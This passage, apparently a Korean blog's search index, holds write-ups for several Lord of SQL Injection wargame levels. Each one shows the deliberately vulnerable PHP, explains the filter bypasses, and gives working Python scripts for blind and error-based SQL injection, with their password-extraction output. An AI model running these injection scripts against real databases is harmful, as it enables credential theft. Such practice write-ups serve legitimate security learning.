있다.$ python ex.py [+] Start[+] Find password[+] Found 1 : 8[+] Found 2 : 89[+] Found 3 : 892[+] Found 4 : 8925[+] Found 5 : 89253[+] Found 6 : 892531[+] Found 7 : 8925316[+] Found 8 : 89253169[+] Found 9 : 89253169C[+] Found 10 : 89253169CE[+] Found 11 : 89253169CE9[+] Found 12 : 89253169CE98[+] Found 13 : 89253169CE987[+] Found 14 : 89253169CE987D[+] Found 15 : 89253169CE987D1[+] Found 16 : 89253169CE987D15[+] Found password :  89253169CE987D15[+] Endphp에서 md5 함수를 사용하면 알파벳 소문자로 값이 출력되므로, 데이터베이스에 저장된 값도 소문자로 이루어져 있을 것이다.따라서 알파벳 대문자를 소문자로 바꾸어 아래와 같이 입력했다.?flag=89253169ce987d15eagle-jump 서버를 All Clear 했다!!!이제 rubiya 서버에도 몇 문제 안남았으니 빨리 다 풀어야지 ㅎㅎㅎUMARU Clear!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/24/los-umaru.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-24-los-evil-wizard-html": {
        "title": "[Lord of SQL Injection] LoS - evil_wizard 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 24, 2018",
        "author": "",
        "category": "",
        "content": "evil_wizard 문제인데, 이 전에 hell_fire 문제랑 똑같이 생겼다.주석을 보면 same with hell_fire? really?라고 적혀있는데, 뭐가 다른건지 모르겠다.코드는 다음과 같다.------------------------------------------------------------------------------------------query : select id,email,score from prob_evil_wizard where 1 order by------------------------------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|proc|union|sleep|benchmark/i', $_GET[order])) exit(\"No Hack ~_~\");  $query = \"select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}\"; // same with hell_fire? really?  echo \"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;\";  $rows = mysql_query($query);  while(($result = mysql_fetch_array($rows))){    if($result['id'] == \"admin\") $result['email'] = \"**************\";    echo \"&lt;tr&gt;&lt;td&gt;{$result[id]}&lt;/td&gt;&lt;td&gt;{$result[email]}&lt;/td&gt;&lt;td&gt;{$result[score]}&lt;/td&gt;&lt;/tr&gt;\";  }  echo \"&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;\";  $_GET[email] = addslashes($_GET[email]);  $query = \"select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['email']) &amp;&amp; ($result['email'] === $_GET['email'])) solve(\"evil_wizard\");  highlight_file(__FILE__);?&gt;코드를 보면 이 전 문제인 hell_fire와 똑같다.그런데 주석에 same with hell_fire? really?가 있는 것을 보니 뭔가 다른 부분이 있는 것 같았다.그래서 ?order=id를 입력 해 무슨 값이 들어있나 확인 해 보았다.            id             email             score                  admin             ******             50              rubiya             rubiya805@gmail.com             100      지난 문제에서는 admin의 score가 200이었어서, order by 뒤에 id를 넣을때와 score를 넣을 때가 결과가 달랐다.그런데 이번에는 무슨 값을 넣어도 같은 결과가 나온다.그래서 이 전 문제에서 사용했던 방법을 그대로 테스트 해 보았는데 너무 잘된다. ㅋㅋㅋ뭔가… 이 전 문제는 내가 처음에 생각했던 방법대로 풀 수 있었던 문제인 것 같은데, 뭔가 문제가 망가진 것 같기도 하다.아니면 내가 의도와 다르게 풀었거나…어쨌든 그래서 그냥 이 전 문제 코드 그대로 가져다 풀었다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"http://los.rubiya.kr/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 40):\ttry:\t\tquery = url + \"if((id='admin' and length(email)=\" + str(i) + \"), score, 9999)\"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif '&lt;td&gt;50&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&lt;/td&gt;' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(33, 128):\t\ttry:\t\t\tquery = url + \"if((id='admin' and ord(substr(email, \" + str(j) + \", 1))=\" + str(i) + \"), score, 9999)\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif '&lt;td&gt;50&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&lt;/td&gt;' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"패스워드 길이는 이 전 문제랑 살짝 달랐다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  30[+] Find password[+] Found 1 : a[+] Found 2 : aa[+] Found 3 : aas[+] Found 4 : aasu[+] Found 5 : aasup[+] Found 6 : aasup3[+] Found 7 : aasup3r[+] Found 8 : aasup3r_[+] Found 9 : aasup3r_s[+] Found 10 : aasup3r_se[+] Found 11 : aasup3r_sec[+] Found 12 : aasup3r_secu[+] Found 13 : aasup3r_secur[+] Found 14 : aasup3r_secure[+] Found 15 : aasup3r_secure_[+] Found 16 : aasup3r_secure_e[+] Found 17 : aasup3r_secure_em[+] Found 18 : aasup3r_secure_ema[+] Found 19 : aasup3r_secure_emai[+] Found 20 : aasup3r_secure_email[+] Found 21 : aasup3r_secure_email@[+] Found 22 : aasup3r_secure_email@e[+] Found 23 : aasup3r_secure_email@em[+] Found 24 : aasup3r_secure_email@ema[+] Found 25 : aasup3r_secure_email@emai[+] Found 26 : aasup3r_secure_email@emai1[+] Found 27 : aasup3r_secure_email@emai1.[+] Found 28 : aasup3r_secure_email@emai1.c[+] Found 29 : aasup3r_secure_email@emai1.co[+] Found 30 : aasup3r_secure_email@emai1.com[+] Found password :  aasup3r_secure_email@emai1.com[+] End결과로 나온 이메일 값을 아래와 같이 넘겨주었다.?email=aasup3r_secure_email@emai1.com힣 코드 한개로 2문제 풀었다! 개꿀!------------------------------------------------------------------------------------------query : select id,email,score from prob_evil_wizard where 1 order by------------------------------------------------------------------------------------------EVIL_WIZARD Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|proc|union|sleep|benchmark/i', $_GET[order])) exit(\"No Hack ~_~\");  $query = \"select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}\"; // same with hell_fire? really?  echo \"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;\";  $rows = mysql_query($query);  while(($result = mysql_fetch_array($rows))){    if($result['id'] == \"admin\") $result['email'] = \"**************\";    echo \"&lt;tr&gt;&lt;td&gt;{$result[id]}&lt;/td&gt;&lt;td&gt;{$result[email]}&lt;/td&gt;&lt;td&gt;{$result[score]}&lt;/td&gt;&lt;/tr&gt;\";  }  echo \"&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;\";  $_GET[email] = addslashes($_GET[email]);  $query = \"select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['email']) &amp;&amp; ($result['email'] === $_GET['email'])) solve(\"evil_wizard\");  highlight_file(__FILE__);?&gt;EVIL_WIZARD Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/24/los-evil_wizard.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-23-los-hell-fire-html": {
        "title": "[Lord of SQL Injection] LoS - hell_fire 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 23, 2018",
        "author": "",
        "category": "",
        "content": "이번 문제에는 위에 갑자기 표가 나온다.그리고 pw를 맞추는게 아니라 이번에는 email 주소를 알아야 한다.코드는 다음과 같다.------------------------------------------------------------------------------------------query : select id,email,score from prob_hell_fire where 1 order by------------------------------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|proc|union/i', $_GET[order])) exit(\"No Hack ~_~\");  $query = \"select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}\";  echo \"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;\";  $rows = mysql_query($query);  while(($result = mysql_fetch_array($rows))){    if($result['id'] == \"admin\") $result['email'] = \"**************\";    echo \"&lt;tr&gt;&lt;td&gt;{$result[id]}&lt;/td&gt;&lt;td&gt;{$result[email]}&lt;/td&gt;&lt;td&gt;{$result[score]}&lt;/td&gt;&lt;/tr&gt;\";  }  echo \"&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;\";  $_GET[email] = addslashes($_GET[email]);  $query = \"select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['email']) &amp;&amp; ($result['email'] === $_GET['email'])) solve(\"hell_fire\");  highlight_file(__FILE__);?&gt;코드를 살펴보면 내가 입력한 값은 order by 뒤에 들어간다.그리고 id, email, score를 추출 하는데, 이 때 admin의 email 주소는 **************로 처리된다.쿼리문 위에는 표가 나타나는데, 형태는 다음과 같다.            id             email             score                                                     일단 무슨 값이 저장되어 있는지 확인하기 위해서, ?order=id를 입력해 보았다.그랬더니 표에 다음과 같이 데이터가 나왔다.            id             email             score                  admin             ******             200              rubiya             rubiya805@gmail.cm             100      그래서 문제를 어떻게 풀어야하는지 고민하다가, order by 뒤에 if문을 사용할 수 있다는 사실을 깨달았다.내가 처음에 생각 한 방법은, ?order=if(id='admin' and length(email)&gt;0, score, id)를 쿼리스트링으로 넘겨주는 것이었다.그럼 쿼리문이 아래와 같이 완성된다.select id,email,score from prob_hell_fire where 1 order by if(id='admin' and length(email)&gt;0, score, id)그렇다면 만약 id가 admin이고, 그 email의 길이가 0보다 크다면 조건이 참이기 때문에 score를 기준으로 정렬 할 것이고, 아니라면 id를 기준으로 정렬 할 것이라고 생각했다.그럼 참이라면 rubiya 행이, 거짓이라면 admin의 행이 위에 나타나게 될 것이다.실제로 내가 데이터베이스에서 테스트 해 보면 정상적으로 실행 됬었다.그런데 문제에서는 그게 안됬다.id를 rubiya로 두고 테스트를 할 때는 제대로 참, 거짓에 따라 score 혹은 id를 기준으로 정렬했다.그런데 id='admin'으로 두고 테스트 하면 무조건 admin인 행이 위에 나온다.왜 때문인지 모르겠다.그리고 또 한가지 이상한 점이 있는데, 쿼리스트링으로 ?order=if(id='admin' and length(email)&gt;0, score, 9999)를 넘겨주면 일단 참, 거짓 반응을 구분할 수 있다.하지만 참일 때 score를 기준으로 정렬하는게 아니라, 거짓일 때 score를 기준으로 정렬을 해 조건이 맞지 않으면 rubiya가 위에 나왔다.얘도 왜그러는지 모르겠다…ㅎ그런데 어쨌든 참, 거짓에 따라 결과가 구분이 되길래 아래와 같이 코드를 짜서 돌려 보았다.만약 값이 참이라면 admin 행이, 거짓이라면 rubiya 행이 위에 나와서, admin 행이 위에 나온다면 그 값을 뽑아오게 했다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"http://los.rubiya.kr/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 30):\ttry:\t\tquery = url + \"if((id='admin' and length(email)=\" + str(i) + \"), score, 9999)\"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif '&lt;td&gt;200&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&lt;/td&gt;' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(33, 128):\t\ttry:\t\t\tquery = url + \"if((id='admin' and ord(substr(email, \" + str(j) + \", 1))=\" + str(i) + \"), score, 9999)\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif '&lt;td&gt;200&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&lt;/td&gt;' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"그랬더니 소스코드가 정상적으로 실행되서 문제를 풀 수 있었다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  28[+] Find password[+] Found 1 : a[+] Found 2 : ad[+] Found 3 : adm[+] Found 4 : admi[+] Found 5 : admin[+] Found 6 : admin_[+] Found 7 : admin_s[+] Found 8 : admin_se[+] Found 9 : admin_sec[+] Found 10 : admin_secu[+] Found 11 : admin_secur[+] Found 12 : admin_secure[+] Found 13 : admin_secure_[+] Found 14 : admin_secure_e[+] Found 15 : admin_secure_em[+] Found 16 : admin_secure_ema[+] Found 17 : admin_secure_emai[+] Found 18 : admin_secure_email[+] Found 19 : admin_secure_email@[+] Found 20 : admin_secure_email@e[+] Found 21 : admin_secure_email@em[+] Found 22 : admin_secure_email@ema[+] Found 23 : admin_secure_email@emai[+] Found 24 : admin_secure_email@emai1[+] Found 25 : admin_secure_email@emai1.[+] Found 26 : admin_secure_email@emai1.c[+] Found 27 : admin_secure_email@emai1.co[+] Found 28 : admin_secure_email@emai1.com[+] Found password :  admin_secure_email@emai1.com[+] End이 이메일 주소를 아래와 같이 쿼리스트링으로 넘겨주었더니 문제를 풀 수 있었다.?email=admin_secure_email@emai1.com근데 왜 처음에 생각한 방법이 먹히지 않는지, 왜 거짓일 때 score를 기준으로 정렬하는지는 아직도 모르겠다.나중에 알게된다면 정리 해 둬야겠다.------------------------------------------------------------------------------------------query : select id,email,score from prob_hell_fire where 1 order by------------------------------------------------------------------------------------------HELL_FIRE Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|proc|union/i', $_GET[order])) exit(\"No Hack ~_~\");  $query = \"select id,email,score from prob_hell_fire where 1 order by {$_GET[order]}\";  echo \"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;\";  $rows = mysql_query($query);  while(($result = mysql_fetch_array($rows))){    if($result['id'] == \"admin\") $result['email'] = \"**************\";    echo \"&lt;tr&gt;&lt;td&gt;{$result[id]}&lt;/td&gt;&lt;td&gt;{$result[email]}&lt;/td&gt;&lt;td&gt;{$result[score]}&lt;/td&gt;&lt;/tr&gt;\";  }  echo \"&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;\";  $_GET[email] = addslashes($_GET[email]);  $query = \"select email from prob_hell_fire where id='admin' and email='{$_GET[email]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['email']) &amp;&amp; ($result['email'] === $_GET['email'])) solve(\"hell_fire\");  highlight_file(__FILE__);?&gt;HELL_FIRE Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/23/los-hell_fire.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-22-los-dark-eyes-html": {
        "title": "[Lord of SQL Injection] LoS - dark_eyes 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 22, 2018",
        "author": "",
        "category": "",
        "content": "이번에도 역시 Error를 기반으로 한 Error Based Blind SQL Injection 이다.그런데 이번에는 이 전 문제랑은 약간 다르다.코드는 다음과 같다.------------------------------------------------------------------------------------------query : select id from prob_dark_eyes where id='admin' and pw=''------------------------------------------------------------------------------------------&lt;?php  include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit(\"HeHe\");  $query = \"select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(mysql_error()) exit();  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";    $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"dark_eyes\");  highlight_file(__FILE__);?&gt;이 전 문제에서 사용했던 if가 필터링 대상에 들어가 있고, if를 대체할 수 있는 case나 when도 필터링한다.즉, 조건문을 사용할 수가 없다.그래서 내가 처음에 생각했던 방법은 and와 or을 적절히 이용하는 것이다.만약에 1 or 0이라는 조건이 있다면, 앞의 1이 이미 참이기 때문에 뒤의 0은 체크하지 않는다고 생각했다.반면 0 or 1이라면, 앞의 0이 거짓이기 때문의 뒤의 1을 체크하는 것이다.그래서 앞에 pw의 길이와 내용을 알기 위한 쿼리를 넣고 뒤에 에러를 유발하는 쿼리문을 넣는다면, 앞의 조건이 참이라면 뒤의 에러 유발용 쿼리가 실행되지 않아 정상적으로 페이지가 보일 것이라고 생각했던 것이다.그런데 음… 내가 뭘 잘못 한 것인지 이건 아무리 해도 안됬다.정확히는 쿼리 스트링을 pw=1' or id='admin' and ord('a')=97 or 9e307*2를 넣으면 앞의 id='admin' and ord('a')=97가 참이기 때문에 뒤의 9e307*2에 대해서 에러가 발생하지 않는다.(9e307은 MySQL에서의 최대값이기 때문에 9e307*2를 하면 DOUBLE value is out of range in '(9e307 * 2)'라는 에러가 발생한다.)그런데 pw=1' or id='admin' and length(pw)&gt;0 or 9e307*2을 넣으면 무슨 조건을 넣더라도 무조건 에러가 나왔다.왜 이러는지 이유를 모르겠다 ㅠㅠ그래서 결국 다른 방법을 찾아보아서 아래와 같이 쿼리 스트링을 구성 해 문제를 풀었다.?pw=1' or id='admin' and (select 1 union select (length(pw)=1))#이렇게 하면 만약 length(pw)=1이 참이라면 1을 반환하기 때문에 select 1 union select 1이 되어 한 행만 결과로 나온다.하지만 거짓이라면 select 1 union select 0을 하게 되면, 2개의 행을 반환하기 때문에 Subquery returns more than 1 row라는 오류를 출력한다.이를 바탕으로 pw를 알아내기 위해 아래와 같이 코드를 구현했다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"http://los.rubiya.kr/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 20):\ttry:\t\tquery = url + \"1' or id='admin' and (select 1 union select (length(pw)=\" + str(i) + \"))%23\"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'select id from prob_dark_eyes' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"1' or id='admin' and (select 1 union select (ord(substr(pw, \" + str(j) + \", 1))=\" + str(i) + \"))%23\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'select id from prob_dark_eyes' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"그 결과 소문자와 숫자로 구성 된 8자리 pw값을 얻을 수 있었다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : 5[+] Found 2 : 5a[+] Found 3 : 5a2[+] Found 4 : 5a2f[+] Found 5 : 5a2f5[+] Found 6 : 5a2f5d[+] Found 7 : 5a2f5d3[+] Found 8 : 5a2f5d3c[+] Found password :  5a2f5d3c[+] End이 값을 쿼리스트링으로 넘겨주면 문제를 풀 수 있다.?pw=5a2f5d3c----------------------------------------------------------------------------------------------------query : select id from prob_dark_eyes where id='admin' and pw='5a2f5d3c'----------------------------------------------------------------------------------------------------DARK_EYES Clear!&lt;?php  include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit(\"HeHe\");  $query = \"select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(mysql_error()) exit();  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";    $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"dark_eyes\");  highlight_file(__FILE__);?&gt;DARK_EYES Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/22/los-dark_eyes.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-16-los-iron-golem-html": {
        "title": "[Lord of SQL Injection] LoS - iron_golem 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 16, 2018",
        "author": "",
        "category": "",
        "content": "이번 문제는 Error를 기반으로 한 Error Based Blind SQL Injection 이다.iron_golem 문제이다.코드는 다음과 같다.------------------------------------------------------------------------------------------query : select id from prob_iron_golem where id='admin' and pw=''------------------------------------------------------------------------------------------&lt;?php  include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit(\"HeHe\");  $query = \"select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(mysql_error()) exit(mysql_error());  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";    $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"iron_golem\");  highlight_file(__FILE__);?&gt;이번에는 Hello guest 처럼 내가 누구인지를 출력 해 주는 부분이 없다.또한 sleep와 benchmark가 필터링 되어 있기 때문에 Time Based Blind SQL Injection을 사용할 수 없다.대신 if(mysql_error()) exit(mysql_error());가 추가되었다.때문에 내가 입력한 쿼리에서 에러가 발생할 경우, 이 에러를 확인할 수 있다.그래서 만약 내가 확인하고자 하는 조건이 참일 경우 에러를 출력하고, 아닐 경우에는 출력하지 않도록 공격 쿼리를 구성 해 보았다.id = 'admin' and if(length(pw)=1, (select 1 union select 2), 2)위와 같이 쿼리를 구성 할 경우, 만약 length(pw)=1이 참이라면, select 1 union select 2를 실행할 것이고, 아니라면 2를 실행하게 된다.그런데 select 1 union select 2를 실행하면 Subquery returns more than 1 row 라는 에러를 출력 해 준다.따라서 이를 통해 패스워드의 길이와 각 글자를 알아낼 수 있다.처음에는 단순히 해당 쿼리만을 사용 해 코드를 구현했는데, 결과 값이 나오지 않아 다시 확인 해 보니 이번에도 pw가 한글인 것 같았다.그래서 xavis 문제의 코드를 가져와 hex로 출력하던 값을 decimal로 출력하도록 해 다시 아래와 같이 소스코드를 구현했다.import urllib2import urllibimport requestsdef testEqual(j, num):        try:                query = url + \"1' or id='admin' and if(ord(substr(pw, \" + str(j) + \", 1)) = \" + str(num) + \", (select 1 union select 2), 2)%23\"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                if 'Subquery returns more than 1 row' in r.text:                return True        else:                return Falsedef testBigger(j, num):        try:                query = url + \"1' or id='admin' and if(ord(substr(pw, \" + str(j) + \", 1)) &lt; \" + str(num) + \", (select 1 union select 2), 2)%23\"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                if 'Subquery returns more than 1 row' in r.text:                return True        else:                return Falsedef searchPw(j, start, end):        if start &gt; end:                return \"None\"        mid = (start + end) / 2        if testEqual(j, mid):                return mid        elif testBigger(j, mid):                end = mid - 1        else:                start = mid + 1        return searchPw(j, start, end)               flag = \"\"length = 0url = \"http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 100):        try:                query = url + \"1' or id='admin' and if(length(pw)=\" + str(i) + \", (select 1 union select 2), 2)%23\"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                continue        if 'Subquery returns more than 1 row' in r.text:                length = i                breakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):        flag += str(searchPw(j, 0, 65535)) + \" \"        print \"[+] Found \", str(j), \"'s pw : \", flagprint \"[+] Found password : \", flagprint \"[+] End\"그 결과 아래와 같이 이번에도 18번째 글자 부터는 null이라는 것을 알 수 있었다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  68[+] Find password[+] Found  1 's pw :  47336 [+] Found  2 's pw :  47336 48708 [+] Found  3 's pw :  47336 48708 44732 [+] Found  4 's pw :  47336 48708 44732 50556 [+] Found  5 's pw :  47336 48708 44732 50556 33 [+] Found  6 's pw :  47336 48708 44732 50556 33 48764 [+] Found  7 's pw :  47336 48708 44732 50556 33 48764 50528 [+] Found  8 's pw :  47336 48708 44732 50556 33 48764 50528 50528 [+] Found  9 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 [+] Found  10 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 [+] Found  11 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 [+] Found  12 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 [+] Found  13 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 [+] Found  14 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 [+] Found  15 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 [+] Found  16 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 [+] Found  17 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 [+] Found  18 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 [+] Found  19 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 [+] Found  20 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 [+] Found  21 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 [+] Found  22 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 [+] Found  23 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 [+] Found  24 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 [+] Found  25 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 [+] Found  26 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 [+] Found  27 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 [+] Found  28 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 [+] Found  29 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  30 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  31 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  32 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  33 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  34 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  35 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 